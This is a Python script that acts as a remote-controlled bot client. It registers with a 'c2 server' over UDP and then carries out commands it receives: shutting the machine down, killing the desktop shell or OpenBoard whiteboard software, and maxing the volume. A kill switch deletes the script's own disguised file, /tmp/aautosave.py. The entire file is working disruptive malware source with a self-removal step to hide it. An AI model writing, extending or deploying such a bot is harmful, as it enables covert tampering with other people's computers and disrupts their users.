import socket, time, re, random
import sys, os
from threading import Thread
from subprocess import Popen, PIPE

dsthost = '127.0.0.1'
dstport = 12010
sock = None
TMSI = None
PMSI = None

regex_matches_mode = "(?<=running in\s)(\w+)(?=\smode)"
regex_matches_required_action = "(?<=required\s).*"
regex_groups_imsi = "allocated\s+(\S+),"

def setup_socket(srcport):
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", srcport))

def udp_sendto_nowait(socket, host, port, message=''):
    socket.sendto(message.encode('utf-8'), (host, port))
        
def udp_sendto_action(socket, host, port, action=''):
    socket.sendto(action.encode('utf-8'), (host, port))
    if action == "initial":
        data, _ = socket.recvfrom(1024)
        data.decode('utf-8')
        stringdata = str(data)
        
        ssmode = re.findall(regex_matches_mode, stringdata)[0]
        ssreimsi = re.search(regex_groups_imsi, stringdata)
        ssimsi = ssreimsi.group(1)
        required_action = re.findall(regex_matches_required_action, stringdata)[0]

        udp_sendto_nowait(socket, host, port, str(random.randint(100,999999999999)))
        print(f"Got allocation, c2 server is in {ssmode} mode, IMSI: {ssimsi}, required action: {required_action}")
        

def action_handling(action):
    print(f"Got action: {action}")
    actionpayload = action.split("|")
    if actionpayload[0] == "SHUTDOWN":
        time.sleep(int(actionpayload[1]))
        process = Popen(['poweroff'], stdout=PIPE, stderr=PIPE)
    elif actionpayload[0] == "KILLPLASMASHELL":
        time.sleep(int(actionpayload[1]))
        process = Popen(['pkill', 'plasmashell'], stdout=PIPE, stderr=PIPE)
        time.sleep(2)
        process = Popen(['plasmashell'], stdout=PIPE, stderr=PIPE)
    elif actionpayload[0] == "KILLOPENBOARD":
        time.sleep(int(actionpayload[1]))
        process = Popen(['pkill', 'OpenBoard'], stdout=PIPE, stderr=PIPE)
    elif actionpayload[0] == "VOLUPMAX":
        time.sleep(int(actionpayload[1]))
        process = Popen(['amixer', '-D', 'pulse', 'sset', 'Master', '100%+'], stdout=PIPE, stderr=PIPE)
    elif actionpayload[0] == "KILLSWITCH":
        os.remove("/tmp/aautosave.py")
        sys.exit()

def socket_listening(socket):
    while True:
        data = socket.recv(1024)
        print("Received data from server:", data.decode('utf-8'))
        if data.decode('utf-8')[:6] == "ACTION":
            action_handling(data.decode('utf-8')[6:])
    
if __name__ == "__main__":
    setup_socket(57758)
    udp_sendto_action(sock, dsthost, dstport, action="initial")
    socket_listeting_thread = Thread(target=socket_listening, args=(sock,))
    socket_listeting_thread.start()